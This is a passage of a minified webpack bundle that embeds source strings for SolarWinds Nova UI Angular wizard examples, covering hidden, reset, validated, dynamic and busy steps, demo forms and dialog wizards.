hide and show next step</p>\n    <div class="btn-group">\n        <button\n            nui-button\n            type="button"\n            id="nui-demo-hide-button"\n            (click)="hideStep()"\n            i18n\n        >\n            Hide next step\n        </button>\n        <button\n            nui-button\n            type="button"\n            id="nui-demo-show-button"\n            (click)="showStep()"\n            i18n\n        >\n            Show next step\n        </button>\n    </div>\n</ng-template>\n<ng-template #stepHidden>\n    <p i18n>Hello from second step</p>\n</ng-template>\n'},75522:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\n\nimport { WizardComponent, WizardStepComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-hide-example",\n    templateUrl: "./wizard-hide.example.component.html",\n})\nexport class WizardHiddenExampleComponent {\n    @ViewChild("wizardComponent") wizardComponent: WizardComponent;\n    @ViewChild("wizardStepHidden")\n    wizardStepHiddenComponent: WizardStepComponent;\n\n    public hideStep(): void {\n        this.wizardComponent.hideStep(this.wizardStepHiddenComponent);\n    }\n\n    public showStep(): void {\n        this.wizardComponent.showStep(this.wizardStepHiddenComponent);\n    }\n}\n'},88037:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\nimport { IWizardSelectionEvent, WizardComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-reset-step-example",\n    templateUrl: "./wizard-reset-step.example.component.html",\n})\nexport class WizardResetStepExampleComponent {\n    @ViewChild("wizardComponent") wizardComponent: WizardComponent;\n    public myForm;\n    public secondStepForm;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.myForm = this.formBuilder.group({\n            name: ["", Validators.required],\n            email: [\n                "",\n                [\n                    Validators.required,\n                    Validators.pattern("[^ @]*@[^ @]*"),\n                    Validators.email,\n                ],\n            ],\n            password: ["", [Validators.required]],\n        });\n        this.secondStepForm = this.formBuilder.group({\n            formCheckbox: [false, [Validators.requiredTrue]],\n        });\n    }\n\n    public updateValidity(): void {\n        this.secondStepForm.get("formCheckbox")?.updateValueAndValidity();\n    }\n\n    public onSelectionChange(event: IWizardSelectionEvent): void {\n        const {\n            selectedIndex,\n            previouslySelectedStep,\n            previouslySelectedIndex,\n        } = event;\n\n        /* Example of reset statuses of second step */\n        if (selectedIndex === 0 && previouslySelectedIndex === 1) {\n            if (this.secondStepForm.invalid) {\n                this.wizardComponent.resetStep(previouslySelectedStep);\n            }\n        }\n    }\n}\n'},4458:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #stepWithValidation>\n    <form [formGroup]="myForm">\n        <div class="form-group">\n            <nui-form-field class="d-block mb-4" i18n-caption caption="Name">\n                <nui-textbox\n                    id="stepInputName"\n                    formControlName="name"\n                ></nui-textbox>\n            </nui-form-field>\n        </div>\n        <div class="form-group">\n            <nui-form-field\n                class="d-block mb-4"\n                [control]="myForm.controls[\'email\']"\n                i18n-caption\n                caption="Email"\n            >\n                <nui-textbox\n                    type="email"\n                    id="stepInputEmail"\n                    formControlName="email"\n                ></nui-textbox>\n                <nui-validation-message\n                    for="required"\n                    *ngIf="myForm.controls[\'email\'].errors?.required"\n                    i18n\n                >\n                    This is required\n                </nui-validation-message>\n                <nui-validation-message\n                    for="pattern"\n                    *ngIf="myForm.controls[\'email\'].errors?.pattern"\n                    i18n\n                >\n                    Please put at least "@" to pass this validator\n                </nui-validation-message>\n                <nui-validation-message\n                    for="email"\n                    *ngIf="myForm.controls[\'email\'].errors?.email"\n                    i18n\n                >\n                    This should be a valid email\n                </nui-validation-message>\n                <nui-validation-message [show]="true" i18n>\n                    This message is always here\n                </nui-validation-message>\n            </nui-form-field>\n        </div>\n        <div class="form-group">\n            <nui-form-field\n                class="d-block mb-4"\n                i18n-caption\n                caption="Password"\n                [showOptionalText]="false"\n            >\n                <nui-textbox\n                    type="password"\n                    id="stepInputPassword"\n                    formControlName="password"\n                ></nui-textbox>\n            </nui-form-field>\n        </div>\n    </form>\n</ng-template>\n<ng-template #step2>\n    <p i18n>Hello from second step</p>\n    <p i18n>\n        This step has a handler for the <code>next</code> event fired from this\n        step only, rather than from the entire wizard.\n    </p>\n    <form [formGroup]="secondStepForm">\n        <div class="form-group">\n            <nui-form-field [control]="secondStepForm.controls[\'formCheckbox\']">\n                <nui-validation-message for="required">\n                    Confirm that you have configured all steps which are needed\n                    to proceed.\n                </nui-validation-message>\n                <nui-checkbox\n                    [required]="true"\n                    [checked]="false"\n                    formControlName="formCheckbox"\n                >\n                    I need to be checked to go further\n                </nui-checkbox>\n            </nui-form-field>\n        </div>\n    </form>\n</ng-template>\n<ng-template #step3>\n    <p i18n>This is step #3</p>\n</ng-template>\n<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard-validation"\n    finishText="Finish"\n    i18n-finishText\n    (selectionChange)="onSelectionChange($event)"\n>\n    <nui-wizard-step\n        i18n-title\n        title="Step with validation"\n        [stepTemplate]="stepWithValidation"\n        [stepControl]="myForm.valid"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        #wizardStep2\n        i18n-title\n        title="Second step"\n        [stepTemplate]="step2"\n        [stepControl]="secondStepForm.valid"\n        (next)="updateValidity()"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        i18n-title\n        #wizardStep3\n        title="Third step"\n        [stepTemplate]="step3"\n    ></nui-wizard-step>\n</nui-wizard>\n'},20790:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #step1>\n    <nui-textbox\n        i18n-caption\n        caption="First"\n        name="hint"\n        [value]="hint"\n        customBoxWidth="150px"\n        (textChange)="onOptionChange($event)"\n    >\n    </nui-textbox>\n</ng-template>\n<ng-template #step2>\n    <nui-checkbox\n        name="nui-demo-checkbox"\n        i18n-title\n        title="Check box with help text"\n        i18n-hint\n        hint="This is some help text"\n        required="true"\n        [value]="false"\n        i18n\n        >Check box with help text\n    </nui-checkbox>\n</ng-template>\n\n<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard"\n    finishText="Finish"\n    i18n-finishText\n>\n    <nui-wizard-step\n        id="nui-demo-wizard-step"\n        i18n-title\n        title="First"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        i18n-title\n        title="Final"\n        [stepTemplate]="step2"\n    ></nui-wizard-step>\n</nui-wizard>\n'},88002:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef, ViewChild } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\nimport {\n    DialogService,\n    IBusyConfig,\n    IWizardSelectionEvent,\n    NuiDialogRef,\n    ToastService,\n    WizardComponent,\n    WizardStepComponent,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-simple-example",\n    templateUrl: "./wizard-simple.example.component.html",\n})\nexport class WizardSimpleExampleComponent {\n    @ViewChild("wizardComponent") wizardComponent: WizardComponent;\n    @ViewChild("wizardStep2") wizardStep2Component: WizardStepComponent;\n    @ViewChild("wizardStep3") wizardStep3Component: WizardStepComponent;\n    @ViewChild("dynamicStep") dynamicStep: WizardStepComponent;\n    public myForm;\n    public hint = $localize`example-hint`;\n    public caption = $localize`example-caption`;\n    public vegetables = [\n        $localize`Cabbage`,\n        $localize`Potato`,\n        $localize`Tomato`,\n        $localize`Carrot`,\n    ];\n    public selectedVegetables = [$localize`Potato`, $localize`Tomato`];\n    public secondStepBusyConfig: IBusyConfig = {\n        busy: false,\n        message: $localize`Step is busy`,\n    };\n    public busyConfig: IBusyConfig = {\n        busy: false,\n        message: $localize`Step is busy`,\n    };\n    public selectedIndex: number;\n\n    private activeDialog: NuiDialogRef;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        @Inject(ToastService) private toastService: ToastService,\n        @Inject(DialogService) private dialogService: DialogService\n    ) {\n        this.myForm = this.formBuilder.group({\n            name: ["", Validators.required],\n            email: [\n                "",\n                [Validators.required, Validators.pattern("[^ @]*@[^ @]*")],\n            ],\n            password: ["", [Validators.required, Validators.minLength(8)]],\n        });\n    }\n\n    public onOptionChange(value: string): void {\n        this.hint = value;\n    }\n\n    public isChecked(vegetable: string): boolean {\n        return this.selectedVegetables.indexOf(vegetable) > -1;\n    }\n\n    public valuesChanged(values: any[]): void {\n        this.selectedVegetables = [...values];\n    }\n\n    public addStep(): void {\n        this.wizardComponent.addStepDynamic(\n            this.dynamicStep,\n            this.selectedIndex + 1\n        );\n    }\n\n    public disableSecondStep(): void {\n        this.wizardComponent.disableStep(this.wizardStep2Component);\n    }\n\n    public hideThirdStep(): void {\n        this.wizardComponent.hideStep(this.wizardStep3Component);\n    }\n\n    public visibleThirdStep(): void {\n        this.wizardComponent.showStep(this.wizardStep3Component);\n    }\n\n    public makeSecondStepBusy(): void {\n        this.secondStepBusyConfig.busy = true;\n        this.wizardComponent.navigationControl.next({\n            busyState: this.secondStepBusyConfig,\n            allowStepChange: false,\n        });\n        setTimeout(() => {\n            this.secondStepBusyConfig.busy = false;\n            this.wizardComponent.navigationControl.next({\n                busyState: this.secondStepBusyConfig,\n                allowStepChange: true,\n            });\n        }, 1000);\n    }\n\n    public onNextClick(): void {\n        this.toastService.info({\n            message: $localize`Next button clicked!`,\n            title: $localize`Event`,\n        });\n    }\n\n    public onCancelClick(content: TemplateRef<string>): void {\n        const completeSteps = this.wizardComponent.steps\n            .toArray()\n            .filter((step: WizardStepComponent) => step.complete);\n        if (!completeSteps.length) {\n            this.toastService.info({\n                message: $localize`Cancel button clicked!`,\n                title: $localize`Event`,\n            });\n            return;\n        }\n        this.activeDialog = this.dialogService.open(content, {\n            size: "sm",\n        });\n    }\n\n    public onFinishClick(): void {\n        this.toastService.info({\n            message: $localize`Finish button clicked!`,\n            title: $localize`Event`,\n        });\n    }\n\n    public handleClick(): void {\n        this.toastService.info({\n            message: $localize`Additional button clicked!`,\n            title: $localize`Event`,\n        });\n    }\n\n    public select(event: IWizardSelectionEvent): void {\n        this.selectedIndex = event.selectedIndex;\n    }\n\n    public onButtonClick(title: string): void {\n        title === "Leave" ? this.actionDone() : this.actionCanceled();\n        this.activeDialog.close();\n    }\n\n    public preventGoingNext(): void {\n        this.busyConfig.busy = true;\n        this.wizardComponent.navigationControl.next({\n            busyState: this.busyConfig,\n            allowStepChange: false,\n        });\n        setTimeout(() => {\n            this.busyConfig.busy = false;\n            this.wizardComponent.navigationControl.next({\n                busyState: this.busyConfig,\n                allowStepChange: true,\n            });\n        }, 1000);\n    }\n\n    private actionDone(): void {\n        this.toastService.success({\n            message: $localize`Leave Done!`,\n            title: $localize`Event`,\n        });\n    }\n\n    private actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Canceled!`,\n            title: $localize`Event`,\n        });\n    }\n}\n'},61458:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard-add-dynamic"\n    (selectionChange)="select($event)"\n    finishText="Finish"\n    i18n-finishText\n>\n    <nui-wizard-step\n        #wizardStepAdd\n        i18n-title\n        title="Add step dynamically"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        i18n-title\n        #wizardStep3\n        title="Third step"\n        [stepTemplate]="step3"\n    ></nui-wizard-step>\n</nui-wizard>\n<nui-wizard-step\n    #dynamicStep\n    [title]="\'Dynamic\'"\n    [stepTemplate]="stepWithValidation"\n    [stepControl]="myForm.valid"\n></nui-wizard-step>\n\x3c!-- 1 step --\x3e\n<ng-template #step1>\n    <p i18n>Hi! You can add next step dynamically</p>\n    <button\n        nui-button\n        type="button"\n        id="nui-demo-dynamic-step-button"\n        (click)="addStep()"\n        i18n\n    >\n        Add dynamic step\n    </button>\n</ng-template>\n\x3c!-- 2 step dynamic --\x3e\n<ng-template #stepWithValidation>\n    <form [formGroup]="myForm">\n        <div class="form-group">\n            <nui-form-field class="d-block mb-4" i18n-caption caption="Name">\n                <nui-textbox\n                    id="stepInputName"\n                    formControlName="name"\n                ></nui-textbox>\n            </nui-form-field>\n        </div>\n        <div class="form-group">\n            <nui-form-field\n                class="d-block mb-4"\n                [control]="myForm.controls[\'email\']"\n                i18n-caption\n                caption="Email"\n            >\n                <nui-textbox\n                    type="email"\n                    id="stepInputEmail"\n                    formControlName="email"\n                ></nui-textbox>\n                <nui-validation-message\n                    for="required"\n                    *ngIf="myForm.get([\'email\'])?.errors?.required"\n                    i18n\n                >\n                    This is required\n                </nui-validation-message>\n                <nui-validation-message\n                    for="pattern"\n                    *ngIf="myForm.get([\'email\'])?.errors?.pattern"\n                    i18n\n                >\n                    Please put at least "@" to pass this validator\n                </nui-validation-message>\n                <nui-validation-message\n                    for="email"\n                    *ngIf="myForm.get([\'email\'])?.errors?.email"\n                    i18n\n                >\n                    This should be a valid email?\n                </nui-validation-message>\n                <nui-validation-message [show]="true" i18n>\n                    This message is always here\n                </nui-validation-message>\n            </nui-form-field>\n        </div>\n        <div class="form-group">\n            <nui-form-field\n                class="d-block mb-4"\n                [control]="myForm.controls[\'password\']"\n                i18n-caption\n                caption="Password"\n                [showOptionalText]="false"\n            >\n                <nui-textbox\n                    type="password"\n                    id="stepInputPassword"\n                    formControlName="password"\n                ></nui-textbox>\n                <nui-validation-message\n                    for="required"\n                    *ngIf="myForm.get([\'password\'])?.errors?.required"\n                    i18n\n                >\n                    This is required\n                </nui-validation-message>\n                <nui-validation-message\n                    for="minlength"\n                    *ngIf="myForm.get([\'password\'])?.errors?.minlength"\n                    i18n\n                >\n                    Minimum length is 8\n                </nui-validation-message>\n                <nui-validation-message [show]="true" i18n>\n                    This message is always here\n                </nui-validation-message>\n            </nui-form-field>\n        </div>\n    </form>\n</ng-template>\n\x3c!-- 3 step --\x3e\n<ng-template #step3>\n    <p i18n>This is step #3</p>\n</ng-template>\n'},87150:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy, ViewChild } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    IWizardSelectionEvent,\n    WizardComponent,\n    WizardStepComponent,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-steps-example",\n    templateUrl: "./wizard-steps.example.component.html",\n})\nexport class WizardStepsExampleComponent implements OnDestroy {\n    @ViewChild("wizardComponent") wizardComponent: WizardComponent;\n    @ViewChild("dynamicStep") dynamicStep: WizardStepComponent;\n\n    public selectedIndex: number;\n    public myForm;\n    private readonly destroy$ = new Subject<void>();\n\n    constructor(private formBuilder: FormBuilder) {\n        this.myForm = this.formBuilder.group({\n            name: ["", Validators.required],\n            email: [\n                "",\n                [\n                    Validators.required,\n                    Validators.pattern("[^ @]*@[^ @]*"),\n                    Validators.email,\n                ],\n            ],\n            password: ["", [Validators.required, Validators.minLength(8)]],\n        });\n    }\n\n    public select(event: IWizardSelectionEvent): void {\n        this.selectedIndex = event.selectedIndex;\n    }\n\n    public addStep(): void {\n        // addStepDynamic returns an instance of WizardStepComponent that was dynamically added\n        const step = this.wizardComponent.addStepDynamic(\n            this.dynamicStep,\n            this.selectedIndex + 1\n        );\n\n        step.enter\n            ?.pipe(takeUntil(this.destroy$))\n            .subscribe(() =>\n                console.log(\n                    `Enter event has been emitted from WizardStepComponent`\n                )\n            );\n\n        step.exit\n            ?.pipe(takeUntil(this.destroy$))\n            .subscribe(() =>\n                console.log(\n                    `Exit event has been emitted from WizardStepComponent`\n                )\n            );\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n}\n'},83154:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #stepWithValidation>\n    <form [formGroup]="myForm">\n        <div class="form-group">\n            <nui-form-field class="d-block mb-4" i18n-caption caption="Name">\n                <nui-textbox\n                    id="stepInputName"\n                    formControlName="name"\n                ></nui-textbox>\n            </nui-form-field>\n        </div>\n        <div class="form-group">\n            <nui-form-field\n                class="d-block mb-4"\n                [control]="myForm.controls[\'email\']"\n                i18n-caption\n                caption="Email"\n            >\n                <nui-textbox\n                    type="email"\n                    id="stepInputEmail"\n                    formControlName="email"\n                ></nui-textbox>\n                <nui-validation-message\n                    for="required"\n                    *ngIf="myForm.controls[\'email\'].errors?.required"\n                    i18n\n                >\n                    This is required\n                </nui-validation-message>\n                <nui-validation-message\n                    for="pattern"\n                    *ngIf="myForm.controls[\'email\'].errors?.pattern"\n                    i18n\n                >\n                    Please put at least "@" to pass this validator\n                </nui-validation-message>\n                <nui-validation-message\n                    for="email"\n                    *ngIf="myForm.controls[\'email\'].errors?.email"\n                    i18n\n                >\n                    This should be a valid email\n                </nui-validation-message>\n                <nui-validation-message [show]="true" i18n>\n                    This message is always here\n                </nui-validation-message>\n            </nui-form-field>\n        </div>\n        <div class="form-group">\n            <nui-form-field\n                class="d-block mb-4"\n                i18n-caption\n                caption="Password"\n                [showOptionalText]="false"\n            >\n                <nui-textbox\n                    type="password"\n                    id="stepInputPassword"\n                    formControlName="password"\n                ></nui-textbox>\n            </nui-form-field>\n        </div>\n    </form>\n</ng-template>\n<ng-template #step2>\n    <p i18n>Hello from second step</p>\n    <p i18n>\n        This step has a handler for the <code>next</code> event fired from this\n        step only, rather than from the entire wizard.\n    </p>\n    <form [formGroup]="secondStepForm">\n        <div class="form-group">\n            <nui-form-field [control]="secondStepForm.controls[\'formCheckbox\']">\n                <nui-validation-message for="required">\n                    Confirm that you have configured all steps which are needed\n                    to proceed.\n                </nui-validation-message>\n                <nui-checkbox\n                    [required]="true"\n                    [checked]="false"\n                    formControlName="formCheckbox"\n                >\n                    I need to be checked to go further\n                </nui-checkbox>\n            </nui-form-field>\n        </div>\n    </form>\n</ng-template>\n<ng-template #step3>\n    <p i18n>This is step #3</p>\n</ng-template>\n<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard-validation"\n    finishText="Finish"\n    i18n-finishText\n>\n    <nui-wizard-step\n        i18n-title\n        title="Step with validation"\n        [stepTemplate]="stepWithValidation"\n        [stepControl]="myForm.valid"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        #wizardStep2\n        i18n-title\n        title="Second step"\n        [stepTemplate]="step2"\n        [stepControl]="secondStepForm.valid"\n        (next)="updateValidity()"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        i18n-title\n        #wizardStep3\n        title="Third step"\n        [stepTemplate]="step3"\n    ></nui-wizard-step>\n</nui-wizard>\n'},35982:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\nimport { WizardComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-validation-example",\n    templateUrl: "./wizard-validation.example.component.html",\n})\nexport class WizardValidationExampleComponent {\n    @ViewChild("wizardComponent") wizardComponent: WizardComponent;\n    public myForm;\n    public secondStepForm;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.myForm = this.formBuilder.group({\n            name: this.formBuilder.control("", Validators.required),\n            email: this.formBuilder.control("", [\n                Validators.required,\n                Validators.pattern("[^ @]*@[^ @]*"),\n                Validators.email,\n            ]),\n            password: this.formBuilder.control("", [\n                Validators.required,\n                Validators.minLength(8),\n            ]),\n        });\n        this.secondStepForm = this.formBuilder.group({\n            formCheckbox: [false, [Validators.requiredTrue]],\n        });\n    }\n\n    public updateValidity(): void {\n        this.secondStepForm.controls.formCheckbox?.updateValueAndValidity();\n    }\n}\n'},77810:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h3>Basic Wizard</h3>\n    <ng-template #step1>\n        <p>Contents of the step 1</p>\n    </ng-template>\n    <ng-template #step2>\n        <p>Contents of the step 2</p>\n    </ng-template>\n    <ng-template #step3>\n        <div class="row">\n            <div class="col text-justify">\n                <p>\n                    Review the entire configurations before performing the final\n                    action.\n                </p>\n\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Proin maximus magna non sem bibendum ultricies. Proin non\n                    nisl vel augue eleifend tempor sed sit amet tortor. Nam\n                    vitae fermentum lorem, vel sollicitudin metus. Praesent\n                    consectetur, metus in venenatis condimentum, libero orci\n                    varius justo, maximus efficitur massa ipsum eu quam.\n                    Curabitur ac lacus sed neque facilisis dapibus sed non\n                    lacus. Praesent rhoncus sem at neque fringilla, non faucibus\n                    diam tincidunt. Vestibulum congue sodales elit, quis maximus\n                    lectus dapibus ut. Praesent at tellus vel tellus facilisis\n                    volutpat. Ut est dolor, molestie vehicula bibendum et,\n                    hendrerit non eros. Aliquam erat volutpat. Suspendisse quis\n                    interdum turpis. Nunc in nulla lacinia, sagittis metus ut,\n                    faucibus ligula. Donec finibus posuere ornare. Suspendisse\n                    vel convallis metus, in sodales est. Donec ultricies\n                    hendrerit mi sed convallis. Ut vitae arcu in tellus\n                    hendrerit sodales.\n                </p>\n            </div>\n        </div>\n    </ng-template>\n    <ng-template #step4>\n        <p>\n            Review the entire configurations before performing the final action.\n        </p>\n    </ng-template>\n    <ng-template #busy>\n        <p>Set step to busy</p>\n        <button\n            nui-button\n            type="button"\n            id="nui-demo-busy-button"\n            (click)="makeStepBusy()"\n        >\n            Make current step busy\n        </button>\n    </ng-template>\n\n    <nui-wizard #wizardComponent id="nui-demo-wizard">\n        <nui-wizard-step\n            id="nui-demo-wizard-step1"\n            [title]="\'First\'"\n            [stepTemplate]="step1"\n        ></nui-wizard-step>\n        <nui-wizard-step\n            id="nui-demo-wizard-step2"\n            [title]="\'Second\'"\n            [stepTemplate]="step2"\n        ></nui-wizard-step>\n        <nui-wizard-step\n            id="nui-demo-wizard-step3"\n            [title]="\'Summary\'"\n            [stepTemplate]="step3"\n        ></nui-wizard-step>\n        <button nui-button type="button" id="nui-demo-additional-button">\n            Additional button\n        </button>\n    </nui-wizard>\n    <hr />\n\n    <h3>Wizard in dialog</h3>\n    <ng-template #dialogWizard>\n        <nui-dialog-header\n            title="Wizard dialog"\n            (closed)="closeDialog()"\n        ></nui-dialog-header>\n        <div class="dialog-body compact-mode">\n            <nui-wizard id="nui-demo-wizard-dialog" (cancel)="closeDialog()">\n                <nui-wizard-step\n                    title="Completed"\n                    [stepTemplate]="step1"\n                ></nui-wizard-step>\n                <nui-wizard-step\n                    title="Active"\n                    [stepTemplate]="step2"\n                ></nui-wizard-step>\n                <nui-wizard-step\n                    title="Not visited"\n                    [stepTemplate]="step3"\n                ></nui-wizard-step>\n                <nui-wizard-step\n                    title="Summary"\n                    [stepTemplate]="step4"\n                ></nui-wizard-step>\n            </nui-wizard>\n        </div>\n    </ng-template>\n    <button\n        id="nui-demo-dialog-wizard-btn"\n        nui-button\n        type="button"\n        (click)="openDialog(dialogWizard)"\n    >\n        Open dialog wizard\n    </button>\n    <hr />\n\n    <h3>Busy wizard in dialog</h3>\n    <div class="row d-flex justify-content-center">\n        <div class="col-md-6">\n            <nui-wizard #dialogWizardBusy id="nui-demo-wizard-busy">\n                <nui-wizard-step\n                    id="nui-demo-wizard-step1"\n                    [title]="\'First\'"\n                    [stepTemplate]="busy"\n                ></nui-wizard-step>\n                <nui-wizard-step\n                    id="nui-demo-wizard-step2"\n                    [title]="\'Second\'"\n                    [stepTemplate]="step1"\n                ></nui-wizard-step>\n            </nui-wizard>\n        </div>\n    </div>\n    <hr />\n</div>\n'},67118:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS 